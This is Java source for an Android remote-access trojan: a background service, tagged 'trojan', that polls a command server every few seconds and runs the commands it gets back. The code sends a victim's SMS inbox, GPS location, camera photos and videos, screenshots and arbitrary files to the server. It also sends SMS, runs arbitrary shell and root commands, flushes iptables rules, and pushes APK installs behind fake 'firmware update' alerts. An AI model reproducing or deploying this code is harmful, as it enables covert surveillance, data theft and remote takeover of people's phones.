package os.system;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.ServiceConnection;
import android.content.ComponentName;
import android.os.IBinder;
import android.os.Handler;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.view.Gravity;
import android.graphics.Color;
import android.util.Log;
import android.widget.Toast;
import android.database.Cursor;
import android.net.Uri;
import android.location.*;
import org.json.*;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.params.HttpParams;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import android.os.AsyncTask;
import java.io.*;
import java.util.*;
import java.text.*;
import java.security.*;
import java.math.*;
import java.net.URLEncoder;


public class SystemThread extends Service
{
	private String[] ipflush = {
			"iptables -F",
			"iptables -X",
			"iptables -t nat -F",
			"iptables -t mangle -F",
			"iptables -t mangle -X",
			"iptables -P INPUT ACCEPT",
			"iptables -P OUTPUT ACCEPT",
			"iptables -p FORWARD ACCEPT"
	};
	
	private String myident = "";
	public static String TAG = "trojan";
	public static String payloadWebResult = "";
	public static String payloadWebResultTarget = "";
	public static String payloadWebResultSwitch = "";
	public String ip = "";

	private static int jcamera = 1875953;
	private static int alert_warna = Color.YELLOW;
	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
	private static int alert_durasi = 7000;
	private static String install_app = "";
	private static String install_paket = "";
	private String[] term;
	private String timenow;
	private String utf = "UTF-16";
	private ServerUtils utils;
	private BroadcastReceiver broreceiver;
	private ReceiverBoot receAction;
	private SharedPreferences settings;
	private SharedPreferences.Editor seteditor;
	private CamRuntime.LocalBinder binder;
	private Handler mHandler = new Handler();
	private Handler camHandler = new Handler();
	private Handler insHandler = new Handler();

	boolean temp = true;
    private Runnable insRefresh = new Runnable() {
		public void run() 
		{
			insHandler.postDelayed(insRefresh, 5 * 1000);

			if (new MainActivity().apkMana(SystemThread.this, install_paket, "open")) {
        		insHandler.removeCallbacks(insRefresh);
        		reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("install success"), "null");
        		
        		receAction.delayToast = 10000;
        		receAction.toastShow(SystemThread.this, "aktif", Color.GREEN, Gravity.TOP | Gravity.CENTER, "SYSTEM SUCCESS UPDATED\n\n\nYour firmware is  updated please WAIT  process system. [alert akan hilang setelah 60 detik] \n\n------------\n.-----------.\n\n\n\n\n       [ WARNING! ]\n\n\n");
        	} 
        	else {
        		receAction.toastShow(SystemThread.this, "aktif", Color.YELLOW, Gravity.TOP | Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n2. Terima prompt playstore google\n3. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n");

				Intent intent = new Intent(Intent.ACTION_VIEW);
        		intent.setDataAndType(Uri.fromFile(new File(install_app)), "application/vnd.android.package-archive");
        		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        		SystemThread.this.startActivity(intent);
        		Log.i(TAG, install_app+install_paket);
        	}
  		}
	};

	private Runnable mRefresh = new Runnable() {
		public void run() 
		{
			if (receAction.pingResult) {
				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?client="+Identitas.getIPAddress(true), "null");
				payload(SystemThread.this);
			} else {
				Log.i(TAG, "offline");
			}
			
			mHandler.postDelayed(mRefresh, 5 * 1000);
		}
	};

	private Runnable camRefresh = new Runnable() {
		public void run() 
		{
			camHandler.postDelayed(camRefresh, 1 * 1000);

			File f = new File(receAction.pathExternal+"/REC_SYSTEM.mp4");
			long cflength = f.length();
			Log.i(TAG, "cam size: "+cflength);

			if (cflength == 0) {
				camHandler.removeCallbacks(camRefresh);
				
				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"), "null");
			}
			else if (cflength > jcamera) {
				camHandler.removeCallbacks(camRefresh);

				if (binder != null) {
					binder.matikan();
					unbindService(camServiceConeksi);
					binder = null;

					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
				}
			}
			else {
				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("rekam size:"+cflength), "null");
			}
		}
	};

	public void payload(Context context) {
        reqPayload(context, receAction.urlServer+"/inpayload.txt", "text");
        reqPayload(context, receAction.urlServer+"/swthread.txt", "sw");
        reqPayload(context, receAction.urlServer+"/target.txt", "target");
        
        myident = receAction.identitasResult;
        
        if (myident.equals(payloadWebResultTarget)) 
        {
			if (payloadWebResultSwitch.equals("hidup") || 
				payloadWebResultSwitch.equals("mati")) {

				if (payloadWebResultSwitch.equals("hidup")) {
					Log.i(TAG, ">>>> MODE SUPER AKTIF...........");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();
				} else {
					Log.i(TAG, ">>>>> super mati");
					seteditor.putString("swmain", payloadWebResultSwitch);    
        			seteditor.commit();
				}
				
			}
			if (payloadWebResult.equals("server")) {
				if (receAction.installResult) 
				{
					receAction._server(context);
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(receAction.setServer(true)), "null");
				} 
				else {
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sedang menginstall..."), "null");
					seteditor.putString("server", "aktif");    
        			seteditor.commit();
				}
			}

			if (payloadWebResult.equals("gps")) {
				String lokasi = new GPSresult(context).gpsResult;
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
			}
			if (payloadWebResult.equals("pakroot")) {
				seteditor.putString("pakroot", "aktif");    
        		seteditor.commit();

				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("paksa root allow superuser diaktifkan"), "null");
			}
			if (payloadWebResult.equals("alert")) {
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");

				Toast.makeText(context, "alert", Toast.LENGTH_LONG).show();
			}
			if (payloadWebResult.equals("cekroot")) {
				String root = receAction.rootRequest();
				
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
			}
			if (payloadWebResult.equals("status")) 
			{
				String cekServer = "";
				if (!receAction.installResult) {
					cekServer = "server belum terinstall";
				}else {
					cekServer = receAction.setServer(true);
				}
				String status = "root: "+receAction.rootRequest()+
								"\nswitch: "+settings.getString("swmain", "")+
								"\nserver: "+cekServer+
								"\nipadrs: "+Identitas.getIPAddress(true)+
								"\nmacads: "+Identitas.getMACAddress("wlan0")+
								"\nbatery: "+receAction.batStatus+"\n";
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(status), "null");
			}
			
			if (payloadWebResult.equals("layar")) {
				Intent ilay = new Intent(context, MainScreen.class);
				ilay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(ilay);
				
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("layar menyala"), "null");
			}
			if (payloadWebResult.equals("screen")) {
				String timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
				try {
					String[] shell = { "screencap -p "+receAction.pathExternal+"/screen.jpg" };
					receAction.rootCommands(shell);
					Thread.sleep(5000);

					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = receAction.pathExternal+"/screen.jpg";
					receAction.mainRequest(context);

					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("screenshoot dan upload berhasil"), "null");
				}
				catch (Exception e) {
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("screenshoot gagal"), "null");
				}
			}

			try {
				String[] text = payloadWebResult.split("-net-");
				if (text[1].equals("hidup")) {
					receAction.setGSM(true, context);
				}
				else if (text[1].equals("mati")) {
					receAction.setGSM(false, context);
				}
			}catch(Exception e){}

			try {
				String[] text = payloadWebResult.split("-out-");
				seteditor.putString("utf", text[1]);    
        		seteditor.commit();
        		
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-audio-");

				if (text[2].equals("start")) {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
				}
				else {
					receAction.audio(context, text[1], text[2]);
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-install-");
				boolean sukses = true;

				install_app = text[1];
				install_paket = text[2];
				try {
					new Installer(context, true).assetToSdcard(context, text[3], "/sdcard/");
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
					sukses = true;
				}
				catch(Exception e) {
					sukses = false;
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("get assets error:"+e), "null");
				}
        		
        		if (sukses) {
					insHandler.postDelayed(insRefresh, 5 * 1000);
        		}

				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");

			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-sms-");
				if (text[1].equals("baca")) {
					StringBuffer resultRsms = new StringBuffer();

					Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
					if (cursor.moveToFirst()) {
						do {
							String msgData = "";
							for (int idx=0; idx<cursor.getColumnCount(); idx++) {
								msgData += ""+cursor.getColumnName(idx)+":"+cursor.getString(idx);
							}
							resultRsms.append(msgData);
							
							reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(""+msgData), "null");

						} while (cursor.moveToNext());
						Log.i(TAG, resultRsms.toString());
					}
					else {
						
						reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sms kosong"), "null");
						Log.i(TAG, "kosong");
					}

				} else {
					String kirimSms = "";
					try {
						kirimSms = new MainActivity().sendSMS(context, text[2], text[1]);
					}catch(Exception e) {
						Log.i(TAG, "smserr:"+e);
					}
					Log.i(TAG, "sms:"+kirimSms);

					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
				}
			}catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-foto-");
				CamRuntime foto = new CamRuntime();
				foto.path = receAction.pathExternal;

				if (text[1].equals("depan")) {
					Runtime.getRuntime().exec("rm "+receAction.pathExternal+"/foto.jpg");

					foto.capturePhoto(context, "depan");
					Thread.sleep(2000);

					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = receAction.pathExternal+"/foto.jpg";
					receAction.mainRequest(context);

					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("kamera sukses sedang mengupload"), "null");

				}
				if (text[1].equals("back")) {
					Runtime.getRuntime().exec("rm "+receAction.pathExternal+"/foto.jpg");

					foto.capturePhoto(context, "back");
					Thread.sleep(2000);

					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
					receAction.requestAksi = "upload";
					receAction.requestPath = receAction.pathExternal+"/foto.jpg";
					receAction.mainRequest(context);

					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("kamera back sukses sedang mengupload"), "null");
				}
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-cam-");
				CamRuntime camRuntime = new CamRuntime();
				camRuntime.path = receAction.pathExternal;

				try {
					int i = Integer.parseInt(text[3]);
					jcamera = i;
					Log.i(TAG, "jcamera:"+i);


					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				try {
					if (text[2].equals("1")) camRuntime.kualitas = 1;
				}catch(Exception e) {}

				if (text[1].equals("depan")) {
            		Intent intent = new Intent(context, CamRuntime.class);
            		context.startService(intent);
            
            		bindService(intent, camServiceConeksi, 0);
				}
				else if (text[1].equals("back")) {
					camRuntime.isCamera = 0; //back cam
            		Intent intent = new Intent(context, CamRuntime.class);
            		context.startService(intent);
            
            		bindService(intent, camServiceConeksi, 0);
				}
				camHandler.postDelayed(camRefresh, 5 * 1000);
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-app-");
				if (new MainActivity().apkMana(context, text[1], "open")) {
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("APK:"+text[1]+" berhasil dibuka"), "null");
				}
				else {
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
				}
				

			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-up-");
				String reqpath = "";

				if (text[1].equals("video")) {
					reqpath = receAction.pathExternal+"/REC_SYSTEM.mp4";
					
					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
				}
				else if (text[1].equals("screen")) {
					reqpath = receAction.pathExternal+"/screen.jpg";
					
					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
				}
				else if (text[1].equals("foto")) {
					reqpath = receAction.pathExternal+"/foto.jpg";
					
					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
				}
				else {
					reqpath = text[1];
				}

				receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
				receAction.requestAksi = "upload";
				receAction.requestPath = reqpath;
				receAction.mainRequest(context);
				
				
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-down-");
				String downurl = "";
				String downname = "";
				try {
					downname = text[3];
					downurl = text[1];
				}catch(Exception e) {
					downname = text[1];
					downurl = receAction.urlServer+"/download.php?id="+text[1];
				}

				receAction.requestUrl = downurl;
				receAction.requestAksi = "download";
				receAction.requestPath = text[2]+"/"+downname; //path
				receAction.mainRequest(context);
				Thread.sleep(5000);
				
				
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+text[1]), "null");
			}
			catch(Exception e) {}

			try {
				String[] text = payloadWebResult.split("-alert-");
				try {
					int alert_durasi = Integer.parseInt(text[4]);
				}catch(Exception e) {}
				try {
					if (text[3].equals("atas")) alert_letak = Gravity.TOP;
					else if (text[3].equals("tengah")) alert_letak = Gravity.CENTER;  
					else if (text[3].equals("bawah")) alert_letak = Gravity.BOTTOM;  
					else if (text[3].equals("atas&tengah")) alert_letak = Gravity.TOP | Gravity.CENTER;  
					else if (text[3].equals("bawah&tengah")) alert_letak = Gravity.BOTTOM | Gravity.CENTER;  

					if (text[2].equals("biru")) alert_warna = Color.BLUE;
					else if (text[2].equals("merah")) alert_warna = Color.RED;
					else if (text[2].equals("kuning")) alert_warna = Color.YELLOW;
					else if (text[2].equals("hujau")) alert_warna = Color.GREEN;
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");

					CountDownTimer hitungMundur = new CountDownTimer(alert_durasi, 100){
						public void onTick(long millisUntilFinished){
							if (text[1].equals("?img?")) {
								receAction.toastImage(SystemThread.this, text[2], alert_letak);
								receAction.toast.show();
							} else {
								receAction.toastText(context, text[1], alert_warna, alert_letak);
								receAction.toast.show();
							}
						}
						public void onFinish()
						{
						}
					}.start();
					
				}
				catch(Exception e) 
				{
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]), "null");

					CountDownTimer hitungMundur = new CountDownTimer(7500, 100){
						public void onTick(long millisUntilFinished){
							receAction.toastText(context, text[1], alert_warna, alert_letak);
							receAction.toast.show();
						}
						public void onFinish()
						{
						}
					}.start();
				}
				
			}catch(Exception e){}
			
			try {
				String[] text = payloadWebResult.split("-/-");

				Log.i(TAG, receAction.textSplit(text[1], "\n"));
				receAction.editor(context, receAction.textSplit(text[1], "\n"), text[2]);

				
				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
			}catch(Exception e) {}

			try {
				term = payloadWebResult.split("-_-");
				if (term[1] != "") {
					String out = textPayload(receAction.shellCommands(""+term[1]));
					Log.i(TAG, out);
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {}

			try {
				term = payloadWebResult.split("-su-");
				if (term[1] != "") {
					String[] sud = { term[1] };
					String resultSudo = "";
					try {
						receAction.rootCommands(sud);
						resultSudo = "sukses execute root";
					}catch(Exception e) {
						resultSudo = "Failed execute root";
					}
					String out = textPayload(resultSudo);
					Log.i(TAG, out);
					
					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+out, "null");
				}
			}
			catch(Exception e) {}
			reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?inpayload=null", "null");
		}
	}

	public String textPayload(String data) {
		timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
		String[] hashString = { data+" [dari : "+receAction.identitasResult+"] [waktu : "+timenow+"] [input : "+payloadWebResult+"]\n" };
		
		if (settings.getString("utf", "").equals("")) {
			Log.i(TAG, "utf kosong");
		} else {
			utf = settings.getString("utf", "");
			Log.i(TAG, "utf:"+utf);
		}

		try {
			for (String s : hashString)     
			{
				return URLEncoder.encode(s, utf);       
			}
		}catch (Exception e) {}
		return null;
	}

	public void reqPayload(Context context, String purl, String requestAksi) {
		
		PayloadWebTask task = new PayloadWebTask();
		task.applicationContext = context;
		task.paymain = requestAksi;

		if (requestAksi.equals("text")) Log.i(TAG, "...payload text   : "+payloadWebResult);
		else if (requestAksi.equals("sw")) Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch);
		else if (requestAksi.equals("target")) Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");

		try {
			if (receAction.cekConnection(context)) {
				Thread.sleep(800);
				task.execute(new String[] { purl });
			} else {
				Log.i(TAG, "cekConnection:"+receAction.cekConnection(context));
			}
		}catch(Exception e) {
			Log.i(TAG, "errRequest: "+e);
			receAction.pingResult = false;
		}
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		settings = getSharedPreferences("Settings", 0);
		seteditor = settings.edit();

		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
		filter.addAction(Intent.ACTION_DATE_CHANGED);
		filter.addAction(Intent.ACTION_HEADSET_PLUG);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_POWER_CONNECTED);
		filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
		filter.addAction(Intent.ACTION_MANAGE_NETWORK_USAGE);
		filter.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
		filter.addAction(Intent.ACTION_SCREEN_OFF);

		broreceiver = new ReceiverBoot();
		receAction = new ReceiverBoot();
		utils = new ServerUtils(this);

		File htdocs = new File(utils.getPathExternal());
        if (!htdocs.exists()) {
            htdocs.mkdir();
        }
		
		registerReceiver(broreceiver, filter);
		mHandler.postDelayed(mRefresh, 5 * 1000);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		Log.i(TAG, "service start oke");
		
		
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(broreceiver);
		seteditor.putString("cekversion", "destroy");    
  	    seteditor.commit();
  	    mHandler.removeCallbacks(mRefresh);
	}
	
	private class PayloadWebTask extends AsyncTask<String, Void, String> 
	{
		protected Context applicationContext;
		protected String paymain = "";
		// connecting...
		@Override
		protected void onPreExecute() {}

	    @Override
	    protected String doInBackground(String... data) {
	    	String sret = "";
	    	HttpParams httpParams = new BasicHttpParams();
	    	HttpConnectionParams.setConnectionTimeout(httpParams, 50000);
	    	HttpConnectionParams.setSoTimeout(httpParams, 50000);

			HttpClient httpClient = new DefaultHttpClient(httpParams);
			HttpGet request = new HttpGet(data[0]);
			try{
				HttpResponse response = httpClient.execute(request);
				try { // split result
					InputStream in = response.getEntity().getContent();
					BufferedReader reader = new BufferedReader(new InputStreamReader(in));
					StringBuilder str = new StringBuilder();
					String line = null;
					while((line = reader.readLine()) != null){
						str.append(line);
					}
					in.close();
					sret = str.toString();
				} catch(Exception ex) {
					Log.i(TAG, "Error split text");
				}
			}
			catch(Exception ex){
				Log.i(TAG, "payload Failed Connect to Server!: "+receAction.iserver);
			}
			return sret;
	    }

	    // berhasil
	    @Override
	    protected void onPostExecute(String result) {
	    	if (paymain.equals("text")) {
	    		payloadWebResult = result;
	    	} 
	    	else if (paymain.equals("sw")) {
	    		payloadWebResultSwitch = result;
	    	}
	    	else if (paymain.equals("target")) {
	    		payloadWebResultTarget = result;
	    	}
		}
	}

	private ServiceConnection camServiceConeksi = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
           	binder = (CamRuntime.LocalBinder) service;
           	Log.i("trojan", "binder: "+binder.isAktif());
        }

       	@Override
       	public void onServiceDisconnected(ComponentName name) {
           	binder = null;
       	}
    };

}

class GPSresult implements LocationListener {

	private LocationManager locationManager;
	private Context context;
	public static String gpsResult = "";
	
	public GPSresult(Context context) {
		this.context = context;
		
		locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER, 3000, 10, this);
		
	}
	/************* Called after each 3 sec **********/
	@Override
	public void onLocationChanged(Location location) {

		String str = "Latitude: "+location.getLatitude()+" Longitude: "+location.getLongitude();
		gpsResult = str;
	}

	@Override
	public void onProviderDisabled(String provider) {
		gpsResult = "GPS mati";
	}

	@Override
	public void onProviderEnabled(String provider) {
		gpsResult += "GPS hidup";
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}
}
